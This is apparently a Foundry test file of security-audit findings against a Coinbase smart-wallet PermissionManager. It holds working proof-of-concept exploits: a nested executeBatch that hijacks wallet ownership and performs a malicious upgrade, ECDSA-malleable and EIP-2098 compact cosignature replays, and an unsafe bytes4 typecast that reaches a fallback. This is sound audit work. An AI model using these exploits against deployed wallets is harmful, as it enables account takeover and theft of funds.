// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import {Test, console2} from "forge-std/Test.sol";
import {PermissionCallable} from "src/mixins/PermissionCallable.sol";
import {MockCoinbaseSmartWallet} from "./mocks/MockCoinbaseSmartWallet.sol";
import {ERC4337, MockERC4337} from "solady/../test/utils/mocks/MockERC4337.sol";
import {PermissionManager} from "../src/PermissionManager.sol";
import {MockPermissionContract} from "./mocks/MockPermissionContract.sol";
import {UserOperation, UserOperationLib} from "src/utils/UserOperationLib.sol";
import {CoinbaseSmartWallet} from "smart-wallet/CoinbaseSmartWallet.sol";
import {MultiOwnable} from "smart-wallet/MultiOwnable.sol";
import {MagicSpend} from "magic-spend/MagicSpend.sol";
import {IEntryPoint} from "lib/smart-wallet/lib/account-abstraction/contracts/interfaces/IEntryPoint.sol";
import {ECDSA} from "solady/utils/ECDSA.sol";
import {EntrypointRuntimeBytecode} from "./EntrypointRuntimeBytecode.sol";
import {ERC1967Proxy} from "smart-wallet/../lib/webauthn-sol/lib/FreshCryptoLib/solidity/tests/WebAuthn_forge/lib/openzeppelin-contracts/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {UUPSUpgradeable} from "solady/utils/UUPSUpgradeable.sol";

contract Findings is Test, EntrypointRuntimeBytecode {
    PermissionManager permissionManager;
    uint256 ownerPk = uint256(keccak256("owner"));
    address owner = vm.addr(ownerPk);
    uint256 cosignerPk = uint256(keccak256("cosigner"));
    address cosigner = vm.addr(cosignerPk);
    uint256 permmissionSignerPk = uint256(keccak256("permissionSigner"));
    address permissionSigner = vm.addr(permmissionSignerPk);
    address entrypoint = 0x5FF137D4b0FDCD49DcA30c7CF57E578a026d2789;
    // userop
    uint256 callGasLimit = 491520;
    uint256 verificationGasLimit = 378989;
    uint256 preVerificationGas = 273196043;
    uint256 maxFeePerGas = 1000304;
    uint256 maxPriorityFeePerGas = 1000000;
    // withdraw request
    MagicSpend.WithdrawRequest withdrawRequest = MagicSpend.WithdrawRequest({
        asset: address(0x0),
        amount: 274908076657120,
        nonce: 0,
        expiry: type(uint48).max,
        signature: '' // empty; must be populated per test
    });

    MockCoinbaseSmartWallet account;
    MockPermissionContract successPermissionContract;
    MockPermissionContract failPermissionContract;

    // when PermissionManager is enabled for a coinbase smart wallet with another smart contract wallet owner (eg a second coinbase smart wallet or a gnosis safe),
    // the second smart wallet can be leveraged to hijack ownership and perform malicious upgrades using a nested `executeBatch()`
    function test_hijackNestedExecuteBatch() public {
        _etchEntrypoint();
        MagicSpend paymaster = new MagicSpend(owner, 1);

        // configure PermissionManager singleton and dummy PermissionContract
        permissionManager = new PermissionManager(owner, cosigner);
        vm.startPrank(owner);
        permissionManager.setPaymasterEnabled(address(paymaster), true);
        successPermissionContract = new MockPermissionContract(false);
        permissionManager.setPermissionContractEnabled(address(successPermissionContract), true);
        vm.stopPrank();
        
        // deploy innocent smart contract wallets and initialize them with each other as owners
        MockCoinbaseSmartWallet victimWalletImpl = new MockCoinbaseSmartWallet(); // only victim ("first") wallet used as proxy for brevity, + to show malicious upgrade
        MockCoinbaseSmartWallet victimWallet = MockCoinbaseSmartWallet(payable(address(new ERC1967Proxy(address(victimWalletImpl), ''))));
        MockCoinbaseSmartWallet pivotWallet = new MockCoinbaseSmartWallet();
        bytes[] memory victimWalletOwners = new bytes[](2);
        victimWalletOwners[0] = abi.encode(owner);
        victimWalletOwners[1] = abi.encode(address(pivotWallet));
        victimWallet.initialize(victimWalletOwners);
        bytes[] memory pivotWalletOwners = new bytes[](1);
        pivotWalletOwners[0] = abi.encode(address(victimWallet));
        pivotWallet.initialize(pivotWalletOwners);

        // enable permissions on both wallets by adding PermissionManager singleton as owner to each
        vm.prank(address(victimWallet));
        pivotWallet.addOwnerAddress(address(permissionManager));
        vm.prank(address(pivotWallet));
        victimWallet.addOwnerAddress(address(permissionManager));

        // create dummy permission with approval
        PermissionManager.Permission memory permission = _createPermissionWithApproval(victimWallet);

        // create malicious owner wallet to be added via nested call to `pivotWallet.executeBatch()`
        address maliciousOwner = address(payable(new MockCoinbaseSmartWallet()));

        // deposit funds on behalf of paymaster
        vm.deal(address(paymaster), 100 ether);
        vm.prank(address(paymaster));
        entrypoint.call{value: 10 ether}('');

        // form malicious `userOp` containing nested `executeBatch()` call
        UserOperation memory userOp = _createUserOpNestedExecuteBatch(permission, address(paymaster), payable(address(victimWallet)), address(pivotWallet), maliciousOwner);

        withdrawRequest.signature = _getSignature(paymaster.getHash(address(victimWallet), withdrawRequest), ownerPk);
        userOp.paymasterAndData = abi.encodePacked(paymaster, abi.encode(withdrawRequest));

        // `entryPoint.getUserOpHash(userOp)`
        (, bytes memory ret) = entrypoint.call(bytes.concat(hex'a6193531', abi.encode(userOp)));
        bytes32 userOpHash = bytes32(ret);

        userOp.signature = victimWallet.wrapSignature(0, _getSignature(userOpHash, ownerPk));

        PermissionManager.PermissionedUserOperation memory permissionedUserOp;
        permissionedUserOp.userOp = userOp;
        permissionedUserOp.permission = permission;

        permissionedUserOp.userOpSignature = _getSignature(userOpHash, permmissionSignerPk);
        permissionedUserOp.userOpCosignature = _getSignature(userOpHash, cosignerPk);

        // malicious permissioned `userOp` passes `isValidSignature()` check
        bytes4 magicValue = permissionManager.isValidSignature(userOpHash, abi.encode(permissionedUserOp));
        assertEq(magicValue, bytes4(0x1626ba7e));

        // malicious permissioned `userOp` passes `validateUserOp()` check
        vm.prank(entrypoint);
        victimWallet.validateUserOp(userOp, userOpHash, 0);
        
        // execute `userOp` which hijacks the first CB smart wallet by leveraging its other owner
        UserOperation[] memory ops = new UserOperation[](1);
        ops[0] = userOp;
        bytes memory handleOpsCall = abi.encodeWithSelector(0x1fad948c, ops, payable(address(0xc0ffee)));
        entrypoint.call(handleOpsCall);
    }

    function _createUserOpNestedExecuteBatch(PermissionManager.Permission memory permission, address paymaster, address payable victimWallet, address pivotWallet, address maliciousOwner) internal returns (UserOperation memory) {
        UserOperation memory userOp;

        userOp.sender = victimWallet;
        // dummy placeholders
        userOp.nonce = 0;
        userOp.callGasLimit = callGasLimit;
        userOp.verificationGasLimit = verificationGasLimit;
        userOp.preVerificationGas = preVerificationGas;
        userOp.maxFeePerGas = maxFeePerGas;
        userOp.maxPriorityFeePerGas = maxPriorityFeePerGas;

        CoinbaseSmartWallet.Call[] memory calls = new CoinbaseSmartWallet.Call[](2);
        bytes memory beforeCallsData = abi.encodeWithSelector(PermissionManager.beforeCalls.selector, permission, paymaster, cosigner);
        calls[0] = CoinbaseSmartWallet.Call(address(permissionManager), 0, beforeCallsData);

        // populate `calls` with a nested ExecuteBatch call to the second smart wallet owner which "reenters" the first smart wallet with malicious owner changes and an upgrade
        CoinbaseSmartWallet.Call[] memory nestedCalls = new CoinbaseSmartWallet.Call[](4);
        bytes memory maliciousAddOwnerCall = abi.encodeWithSelector(MultiOwnable.addOwnerAddress.selector, maliciousOwner);
        nestedCalls[0] = CoinbaseSmartWallet.Call(victimWallet, 0, maliciousAddOwnerCall);
        bytes memory ownerAtIndex0 = CoinbaseSmartWallet(victimWallet).ownerAtIndex(0);
        bytes memory maliciousRemoveOwnerCall0 = abi.encodeWithSelector(MultiOwnable.removeOwnerAtIndex.selector, 0, ownerAtIndex0);
        nestedCalls[1] = CoinbaseSmartWallet.Call(victimWallet, 0, maliciousRemoveOwnerCall0);
        bytes memory maliciousUpgradeCall = abi.encodeWithSelector(UUPSUpgradeable.upgradeToAndCall.selector, maliciousOwner, '');
        nestedCalls[2] = CoinbaseSmartWallet.Call(victimWallet, 0, maliciousUpgradeCall);
        bytes memory ownerAtIndex1 = CoinbaseSmartWallet(victimWallet).ownerAtIndex(1);
        bytes memory maliciousRemoveOwnerCall1 = abi.encodeWithSelector(MultiOwnable.removeOwnerAtIndex.selector, 1, ownerAtIndex1);
        nestedCalls[3] = CoinbaseSmartWallet.Call(victimWallet, 0, maliciousRemoveOwnerCall1);

        bytes memory nestedExecuteBatchData = abi.encodeWithSelector(CoinbaseSmartWallet.executeBatch.selector, nestedCalls);
        
        // calls == [<ValidBeforeCalls>, <ExecuteBatch(<AddMaliciousOwnerCall>,<RemoveExistingOwner0>,<MaliciousUpgrade>,<RemoveExistingOwner1>)>]
        calls[1] = CoinbaseSmartWallet.Call(pivotWallet, 0, nestedExecuteBatchData);

        userOp.callData = abi.encodeWithSelector(
            CoinbaseSmartWallet.executeBatch.selector,
            calls
        );

        return userOp;
    }

    function _createPermissionWithApproval(MockCoinbaseSmartWallet smartAccount) internal returns (PermissionManager.Permission memory permWithApproval) {
        permWithApproval = _createPermission(smartAccount);

        bytes32 permissionHash = permissionManager.hashPermission(permWithApproval);
        bytes32 replaySafeHash = smartAccount.replaySafeHash(permissionHash);

        // user approves a permission
        bytes memory ownerSig = _getSignature(replaySafeHash, ownerPk);
        bytes memory approval = smartAccount.wrapSignature(0, ownerSig);
        permWithApproval.approval = approval;
    }

    function test_malleableCosignatureReplay() public {
        _etchEntrypoint();
        _initializePermissionManager();

        PermissionManager.Permission memory permission = _createPermission(account);

        bytes32 permissionHash = permissionManager.hashPermission(permission);
        bytes32 replaySafeHash = account.replaySafeHash(permissionHash);

        // user approves a permission
        bytes memory ownerSig = _getSignature(replaySafeHash, ownerPk);
        bytes memory approval = account.wrapSignature(0, ownerSig);
        permission.approval = approval;

        UserOperation memory userOp = _createUserOp(permission);
        PermissionManager.PermissionedUserOperation memory permissionedUserOp;
        permissionedUserOp.userOp = userOp;
        permissionedUserOp.permission = permission;

        // `entryPoint.getUserOpHash(userOp)`
        (, bytes memory ret) = entrypoint.call(bytes.concat(hex'a6193531', abi.encode(userOp)));
        bytes32 userOpHash = bytes32(ret);

        bytes memory uoSig = _getSignature(userOpHash, permmissionSignerPk);
        permissionedUserOp.userOpSignature = uoSig;

        (uint8 cosigV, bytes32 cosigR, bytes32 cosigS) = vm.sign(cosignerPk, userOpHash);
        bytes memory uoCosig = abi.encodePacked(cosigR, cosigS, cosigV);

        permissionedUserOp.userOpCosignature = uoCosig;

        bytes4 magicValue = permissionManager.isValidSignature(userOpHash, abi.encode(permissionedUserOp));
        bytes4 canonicalEIP1271Val = bytes4(0x1626ba7e);
        assertEq(magicValue, canonicalEIP1271Val); // signature is valid on first pass
        
        bytes memory malUoCoSig = _constructMalleableSignatureComplement(cosigR, cosigS, cosigV);
        // both signatures recover to the cosigner despite one being derived from the other without knowing `cosignerPk`
        _proveMalleability(userOpHash, uoCosig, malUoCoSig);

        permissionedUserOp.userOpCosignature = malUoCoSig; // call `isValidSignature()` again w/ constructed malleable sig
        bytes4 magicValueFromMalleableCosignature = permissionManager.isValidSignature(userOpHash, abi.encode(permissionedUserOp));
        assertEq(magicValueFromMalleableCosignature, canonicalEIP1271Val);
    }

    function _constructMalleableSignatureComplement(bytes32 cosigR, bytes32 cosigS, uint8 cosigV) internal returns (bytes memory) {
        uint256 SECP256KN = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;
        uint256 sComplement = SECP256KN - uint256(cosigS);
        uint8 yParityFlipped = cosigV == 0x1b ? 0x1c : 0x1b;
        return abi.encodePacked(cosigR, sComplement, yParityFlipped);
    }

    function test_compactCosignatureReplay() public {
        _etchEntrypoint();
        _initializePermissionManager();

        PermissionManager.Permission memory permission = _createPermissionWithApproval(account);

        bytes32 permissionHash = permissionManager.hashPermission(permission);
        bytes32 replaySafeHash = account.replaySafeHash(permissionHash);

        // user approves a permission
        bytes memory ownerSig = _getSignature(replaySafeHash, ownerPk);
        bytes memory approval = account.wrapSignature(0, ownerSig);
        permission.approval = approval;

        UserOperation memory userOp = _createUserOp(permission);
        PermissionManager.PermissionedUserOperation memory permissionedUserOp;
        permissionedUserOp.userOp = userOp;
        permissionedUserOp.permission = permission;

        // `entryPoint.getUserOpHash(userOp)`
        (, bytes memory ret) = entrypoint.call(bytes.concat(hex'a6193531', abi.encode(userOp)));
        bytes32 userOpHash = bytes32(ret);

        bytes memory uoSig = _getSignature(userOpHash, permmissionSignerPk);
        permissionedUserOp.userOpSignature = uoSig;

        (uint8 cosigV, bytes32 cosigR, bytes32 cosigS) = vm.sign(cosignerPk, userOpHash);
        bytes memory uoCosig = abi.encodePacked(cosigR, cosigS, cosigV);

        permissionedUserOp.userOpCosignature = uoCosig;

        bytes4 magicValue = permissionManager.isValidSignature(userOpHash, abi.encode(permissionedUserOp));
        bytes4 canonicalEIP1271Val = bytes4(0x1626ba7e);
        assertEq(magicValue, canonicalEIP1271Val); // signature is valid on first pass
        
        bytes memory malUoCoSig = _constructEIP2098CompactSignature(cosigR, cosigS, cosigV);
        // both signatures recover to the cosigner despite one being derived from the other without knowing `cosignerPk`
        _proveMalleability(userOpHash, uoCosig, malUoCoSig);

        permissionedUserOp.userOpCosignature = malUoCoSig; // call `isValidSignature()` again w/ constructed malleable sig
        bytes4 magicValueFromMalleableCosignature = permissionManager.isValidSignature(userOpHash, abi.encode(permissionedUserOp));
        assertEq(magicValueFromMalleableCosignature, canonicalEIP1271Val);
    }

    function _constructEIP2098CompactSignature(bytes32 cosigR, bytes32 cosigS, uint8 cosigV) internal returns (bytes memory) {
        // hijack top bit of `cosigS` to encode `yParity` into a compact 64-byte signature
        uint256 yParity = cosigV - 0x1b; 
        bytes32 sEncodedYParity = cosigS | bytes32(yParity << 255);
        return abi.encodePacked(cosigR, sEncodedYParity);
    }

    function _createPermissionedUserOp(PermissionManager.Permission memory permission) internal returns (PermissionManager.PermissionedUserOperation memory, bytes32) {
        UserOperation memory userOp = _createUserOp(permission);
        PermissionManager.PermissionedUserOperation memory permissionedUserOp;
        permissionedUserOp.userOp = userOp;
        permissionedUserOp.permission = permission;

        (, bytes memory ret) = entrypoint.call(bytes.concat(hex'a6193531', abi.encode(permissionedUserOp.userOp)));
        bytes32 userOpHash = bytes32(ret);

        return (permissionedUserOp, userOpHash);
    }

    function _proveMalleability(bytes32 digest, bytes memory originalSig, bytes memory malleableSig) internal {
        address originalRec = ECDSA.recover(digest, originalSig);
        address malRec = ECDSA.recover(digest, malleableSig);
        assertEq(malRec, cosigner);
        assertEq(originalRec, malRec);
    }

    function _initializePermissionManager() internal {
        permissionManager = new PermissionManager(owner, cosigner);
        account = new MockCoinbaseSmartWallet();
        bytes[] memory owners = new bytes[](1);
        owners[0] = abi.encode(owner);
        account.initialize(owners);
        successPermissionContract = new MockPermissionContract(false);
        failPermissionContract = new MockPermissionContract(true);
        vm.prank(owner);
        permissionManager.setPaymasterEnabled(address(0x42), true);
    }

    function _createPermission(MockCoinbaseSmartWallet smartAccount) internal returns (PermissionManager.Permission memory) {
        return PermissionManager.Permission({
            account: address(smartAccount),
            chainId: block.chainid,
            expiry: type(uint48).max,
            signer: abi.encode(permissionSigner),
            permissionContract: address(successPermissionContract),
            permissionValues: hex"",
            verifyingContract: address(permissionManager),
            approval: hex""
        });
    }

    function _createPermissionNonstandard(MockCoinbaseSmartWallet smartAccount) internal returns (bytes memory) {
        return (abi.encodePacked(
            uint256(0x20), // struct ofs
            uint256(uint160(address(smartAccount))), // account
            block.chainid,
            uint256(type(uint48).max), // expiry
            uint256(0x100), // bytes signer ofs
            uint256(uint160(address(successPermissionContract))), // permissionContract
            uint256(0x140), // bytes permissionValues ofs
            uint256(uint160(address(permissionManager))), // verifyingContract
            uint256(0x160), // bytes approval ofs
            uint256(0x20), // bytes signer len
            abi.encode(permissionSigner), // bytes signer content
            uint256(0x0), // bytes permissionValues len
            uint256(0x0) // bytes approval len
        ));
    }

    function _createUserOp(PermissionManager.Permission memory permission) internal returns (UserOperation memory) {
        UserOperation memory userOp;

        userOp.sender = address(account);
        userOp.nonce = 4337;
        address paymaster = address(0x42);
        userOp.paymasterAndData = abi.encodePacked(paymaster);

        CoinbaseSmartWallet.Call[] memory calls = new CoinbaseSmartWallet.Call[](1);
        bytes memory beforeCallsData = abi.encodeWithSelector(PermissionManager.beforeCalls.selector, permission, paymaster, cosigner);
        calls[0] = CoinbaseSmartWallet.Call(address(permissionManager), 0, beforeCallsData);

        userOp.callData = abi.encodeWithSelector(
            CoinbaseSmartWallet.executeBatch.selector,
            calls
        );

        return userOp;
    }

    function _getSignature(bytes32 digest, uint256 privateKey) internal pure returns (bytes memory) {
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(privateKey, digest);
        return abi.encodePacked(r, s, v);
    }

    
    function _etchEntrypoint() internal {
        vm.etch(entrypoint, ENTRYPOINT_RUNTIME_BYTECODE);
    }

    function test_permissionStructs() public {
        _etchEntrypoint();
        _initializePermissionManager();

        // console2.logString('standard:');
        bytes memory permissionBytesStandard = abi.encode(_createPermission(account));
        // console2.logBytes(permissionBytesStandard);
        // console2.logString('nonstandard:');
        bytes memory permissionBytesNonstandard = _createPermissionNonstandard(account);
        // console2.logBytes(permissionBytesNonstandard);

        PermissionManager.Permission memory nonstandardPermission = abi.decode(permissionBytesNonstandard, (PermissionManager.Permission));

        assertEq(nonstandardPermission.account, address(account));
        assertEq(nonstandardPermission.chainId, block.chainid);
        assertEq(nonstandardPermission.expiry, type(uint48).max);
        assertEq(nonstandardPermission.signer, abi.encode(permissionSigner));
        assertEq(nonstandardPermission.permissionContract, address(successPermissionContract));
        assertEq(nonstandardPermission.permissionValues, hex"");
        assertEq(nonstandardPermission.verifyingContract, address(permissionManager));
        assertEq(nonstandardPermission.approval, hex"");

        bytes32 nonstandardPermissionHash = permissionManager.hashPermission(nonstandardPermission);
        bytes32 replaySafeHash = account.replaySafeHash(nonstandardPermissionHash);

        // user approves a permission
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(ownerPk, replaySafeHash);
        bytes memory ownerSig = _getSignature(replaySafeHash, ownerPk);
        bytes memory approval = account.wrapSignature(0, ownerSig);
        nonstandardPermission.approval = approval;

        // register the permission
        // vm.expectEmit(address(permissionManager));
        // emit PermissionManager.PermissionApproved(address(account), nonstandardPermissionHash);
        // permissionManager.approvePermission(nonstandardPermission);
        // vm.assertEq(permissionManager.isPermissionAuthorized(nonstandardPermission), true);
    }

    function test_permissionedCallUnsafeTypecastBytes4() public {
        InnocentContractInheritsPermissionCallable innocentContract = new InnocentContractInheritsPermissionCallable();
        innocentContract.permissionedCall(hex'ffffff');
        assertEq(innocentContract.sensitiveStorage(), hex'ffffff');
        innocentContract.permissionedCall(hex'ffff');
        assertEq(innocentContract.sensitiveStorage(), hex'ffff');
        innocentContract.permissionedCall(hex'ff');
        assertEq(innocentContract.sensitiveStorage(), hex'ff');
        innocentContract.permissionedCall('');
        assertEq(innocentContract.sensitiveStorage(), hex'');
    }
}

contract InnocentContractInheritsPermissionCallable is PermissionCallable {
    bytes public sensitiveStorage; // mutable via fallback

    // this function's selector == 0x00000000
    function supportedPermissionedCallWithAtLeastOneTrailingZeroByte4273234894() public {
        // does innocent intentional stuff
    }

    // this function's selector == 0xff000000
    function supportedPermissionedCallWithAtLeastOneTrailingZeroByte2569728703() public {
        // does innocent intentional stuff
    }

    // this function's selector == 0xffff0000
    function supportedPermissionedCallWithAtLeastOneTrailingZeroByte4600833262() public {
        // does innocent intentional stuff
    }

    // this function's selector == 0xffffff00
    function supportedPermissionedCallWithAtLeastOneTrailingZeroByte15430792436() public {
        // does innocent intentional stuff
    }

    /// @notice Returns true if `selector` is passed with 0x00000000, 0xff000000, 0xffff0000, or 0xffffff00
    /// These 4-byte values will be passed in by `permissionedCall()` after its unsafe typecast padding 
    function supportsPermissionedCallSelector(bytes4 selector) public view virtual override returns (bool) {
        if (
            selector == this.supportedPermissionedCallWithAtLeastOneTrailingZeroByte4273234894.selector ||
            selector == this.supportedPermissionedCallWithAtLeastOneTrailingZeroByte2569728703.selector ||
            selector == this.supportedPermissionedCallWithAtLeastOneTrailingZeroByte4600833262.selector ||
            selector == this.supportedPermissionedCallWithAtLeastOneTrailingZeroByte15430792436.selector
        ) {
            return true;
        }
    }

    /// @notice If `this.permissionedCall(bytes calldata call)` is invoked with any of the following:
    ///   `call == ''` || `call == hex'00'` || `call == hex'ff'` || `call == hex'ffff'` || `call == hex'ffffff'`
    /// This fallback function will be executed instead of intended behavior which is to revert
    fallback(bytes calldata uhOh) external returns (bytes memory) {
        require(msg.sender != address(this), "Sensitive stuff happens here: self-delegatecall only!");
        sensitiveStorage = uhOh;
        return sensitiveStorage;
    }
}

/**stanndard:
0000000000000000000000000000000000000000000000000000000000000020 struct ofs
0000000000000000000000002e234dae75c793f67a35089c9d99245e1c58470b account
0000000000000000000000000000000000000000000000000000000000007a69 chainid
0000000000000000000000000000000000000000000000000000ffffffffffff expiry
0000000000000000000000000000000000000000000000000000000000000100 signer ofs
000000000000000000000000f62849f9a0b5bf2913b396098f7c7019b51a820a permissionContract
0000000000000000000000000000000000000000000000000000000000000140 permissionValues ofs
0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f verifyingContract
0000000000000000000000000000000000000000000000000000000000000160 approval ofs
0000000000000000000000000000000000000000000000000000000000000020 signer len
000000000000000000000000a02238d882bd542b8f44a932e1931c794b447f05 signer (bytes)
0000000000000000000000000000000000000000000000000000000000000000 permissionValues len
0000000000000000000000000000000000000000000000000000000000000000 approval len

nonstandard:
0000000000000000000000000000000000000000000000000000000000000020 struct ofs
0000000000000000000000002e234dae75c793f67a35089c9d99245e1c58470b account
0000000000000000000000000000000000000000000000000000000000007a69 chainid
0000000000000000000000000000000000000000000000000000ffffffffffff expiry
0000000000000000000000000000000000000000000000000000000000000100 signer ofs
000000000000000000000000f62849f9a0b5bf2913b396098f7c7019b51a820a permissionContract
0000000000000000000000000000000000000000000000000000000000000140 permissionValues ofs
0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f verifyingContract
0000000000000000000000000000000000000000000000000000000000000160 approval ofs
0000000000000000000000000000000000000000000000000000000000000020 signer len
000000000000000000000000a02238d882bd542b8f44a932e1931c794b447f05 signer (bytes)
0000000000000000000000000000000000000000000000000000000000000000 permissionValues len
0000000000000000000000000000000000000000000000000000000000000000 approval len

wrong:
 0x00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000066000000000000000000000000000000000000000000000000000000000000006e000000000000000000000000000000000000000000000000000000000000007600000000000000000000000002e234dae75c793f67a35089c9d99245e1c58470b00000000000000000000000000000000000000000000000000000000000010f10000000000000000000000000000000000000000000000000000000000000160000000000000000000000000000000000000000000000000000000000000018000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000058000000000000000000000000000000000000000000000000000000000000005c0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003c434fcd5be0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000002c44fbfa73500000000000000000000000000000000000000000000000000000000000000600000000000000000000000000000000000000000000000000000000000000042000000000000000000000000a02238d882bd542b8f44a932e1931c794b447f050000000000000000000000002e234dae75c793f67a35089c9d99245e1c58470b0000000000000000000000000000000000000000000000000000000000007a690000000000000000000000000000000000000000000000000000ffffffffffff0000000000000000000000000000000000000000000000000000000000000100000000000000000000000000f62849f9a0b5bf2913b396098f7c7019b51a820a00000000000000000000000000000000000000000000000000000000000001400000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f00000000000000000000000000000000000000000000000000000000000001600000000000000000000000000000000000000000000000000000000000000020000000000000000000000000675fb4bdcc4ce89bda65febae329fd1c805a9cd3000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000e0000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000004196ff1d08d9ecba191d7ac95873d26e56a14f70bae3859a27f30ecc96729aa5582c2d0ac514e70723fea14758855fe45a4fae166632ccebfe2b3d583d3727545a1b0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000014000000000000000000000000000000000000004200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000041f77af70891c41bd5553d09d3503d2b10361b7a3f081903eb6156be927b881754521d4c3d97f91b7aa8a7cb87dfc9931f88f7a7a0817ab4d148ec2aea40019fda1c00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004196ff1d08d9ecba191d7ac95873d26e56a14f70bae3859a27f30ecc96729aa558d3d2f53aeb18f8dc015eb8a77aa01ba46b00c6807c7bb43d9495064f990eece71c000000000000000000000000000000000000000000000000000000000000000000000000000000000000002e234dae75c793f67a35089c9d99245e1c58470b0000000000000000000000000000000000000000000000000000000000007a690000000000000000000000000000000000000000000000000000ffffffffffff0000000000000000000000000000000000000000000000000000000000000100000000000000000000000000f62849f9a0b5bf2913b396098f7c7019b51a820a00000000000000000000000000000000000000000000000000000000000001400000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f00000000000000000000000000000000000000000000000000000000000001600000000000000000000000000000000000000000000000000000000000000020000000000000000000000000675fb4bdcc4ce89bda65febae329fd1c805a9cd3000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000e0000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000004196ff1d08d9ecba191d7ac95873d26e56a14f70bae3859a27f30ecc96729aa5582c2d0ac514e70723fea14758855fe45a4fae166632ccebfe2b3d583d3727545a1b00000000000000000000000000000000000000000000000000000000000000

correct:
 0x00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000066000000000000000000000000000000000000000000000000000000000000006e000000000000000000000000000000000000000000000000000000000000007600000000000000000000000002e234dae75c793f67a35089c9d99245e1c58470b00000000000000000000000000000000000000000000000000000000000010f10000000000000000000000000000000000000000000000000000000000000160000000000000000000000000000000000000000000000000000000000000018000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000058000000000000000000000000000000000000000000000000000000000000005c0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003c434fcd5be0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000002c44fbfa73500000000000000000000000000000000000000000000000000000000000000600000000000000000000000000000000000000000000000000000000000000042000000000000000000000000a02238d882bd542b8f44a932e1931c794b447f050000000000000000000000002e234dae75c793f67a35089c9d99245e1c58470b0000000000000000000000000000000000000000000000000000000000007a690000000000000000000000000000000000000000000000000000ffffffffffff0000000000000000000000000000000000000000000000000000000000000100000000000000000000000000f62849f9a0b5bf2913b396098f7c7019b51a820a00000000000000000000000000000000000000000000000000000000000001400000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f00000000000000000000000000000000000000000000000000000000000001600000000000000000000000000000000000000000000000000000000000000020000000000000000000000000675fb4bdcc4ce89bda65febae329fd1c805a9cd3000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000e0000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000004196ff1d08d9ecba191d7ac95873d26e56a14f70bae3859a27f30ecc96729aa5582c2d0ac514e70723fea14758855fe45a4fae166632ccebfe2b3d583d3727545a1b0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000014000000000000000000000000000000000000004200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000041f77af70891c41bd5553d09d3503d2b10361b7a3f081903eb6156be927b881754521d4c3d97f91b7aa8a7cb87dfc9931f88f7a7a0817ab4d148ec2aea40019fda1c00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004165cc7cb6269133231e354c833f39d62d0d10fd395406f4b23e68a46989a3c6335e7f306ff0d192213d89447e2bd4c2468d8464887a66b6ef1e26df8468f627c81b000000000000000000000000000000000000000000000000000000000000000000000000000000000000002e234dae75c793f67a35089c9d99245e1c58470b0000000000000000000000000000000000000000000000000000000000007a690000000000000000000000000000000000000000000000000000ffffffffffff0000000000000000000000000000000000000000000000000000000000000100000000000000000000000000f62849f9a0b5bf2913b396098f7c7019b51a820a00000000000000000000000000000000000000000000000000000000000001400000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f00000000000000000000000000000000000000000000000000000000000001600000000000000000000000000000000000000000000000000000000000000020000000000000000000000000675fb4bdcc4ce89bda65febae329fd1c805a9cd3000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000e00000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000